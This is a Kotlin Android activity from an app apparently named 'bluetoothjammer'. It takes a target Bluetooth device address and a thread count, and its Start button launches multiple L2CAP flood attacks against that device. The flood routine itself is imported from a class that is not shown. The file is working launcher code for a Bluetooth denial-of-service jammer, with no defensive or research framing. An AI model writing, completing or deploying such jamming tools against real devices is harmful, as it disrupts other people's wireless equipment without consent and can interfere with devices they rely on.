package com.eikarna.bluetoothjammer

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import api.L2capFloodAttack

class AttackActivity : AppCompatActivity() {

    // Initialize UI elements
    private lateinit var viewDeviceName: TextView
    private lateinit var viewDeviceAddress: TextView
    private lateinit var viewThreads: TextView
    private lateinit var buttonStartStop: Button
    private lateinit var attackThread: Thread

    // Initialize detail info
    private lateinit var deviceName: String
    private lateinit var address: String
    private var threads: Int = 1

    companion object {
        @JvmStatic
        var isAttacking = false
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        Log.d("AttackActivity", "onCreate called")
        println("AttackActivity onCreate called")
        super.onCreate(savedInstanceState)
        setContentView(R.layout.attack_layout)

        // Get data from Intent
        deviceName = intent.getStringExtra("DEVICE_NAME") ?: "Unknown Device"
        address = intent.getStringExtra("ADDRESS") ?: "Unknown Address"
        threads = intent.getIntExtra("THREADS", 1)

        // Get Element ID
        viewDeviceName = findViewById(R.id.textViewDeviceName)
        viewDeviceAddress = findViewById(R.id.textViewAddress)
        viewThreads = findViewById(R.id.textViewThreads)
        buttonStartStop = findViewById(R.id.buttonStartStop)

        // Set text views
        viewDeviceName.text = "Device Name: $deviceName"
        viewDeviceAddress.text = "Address: $address"
        viewThreads.text = "Threads: $threads"

        // Set button listener
        buttonStartStop.setOnClickListener {
            if (isAttacking) {
                stopAttack()
            } else {
                startAttack()
            }
        }
    }

    @SuppressLint("MissingPermission")
    private fun startAttack() {
        isAttacking = true
        buttonStartStop.text = "Stop"
        BluetoothAdapter.getDefaultAdapter().cancelDiscovery()
        for (i in 0..threads) L2capFloodAttack(address).startAttack()
    }

    @SuppressLint("MissingPermission")
    private fun stopAttack() {
        isAttacking = false
        buttonStartStop.text = "Start"
        BluetoothAdapter.getDefaultAdapter().startDiscovery()
        L2capFloodAttack(address).stopAttack()
    }

    override fun onDestroy() {
        super.onDestroy()
        if (isAttacking) {
            stopAttack() // Ensure the attack stops if the activity is destroyed
        }
    }
}
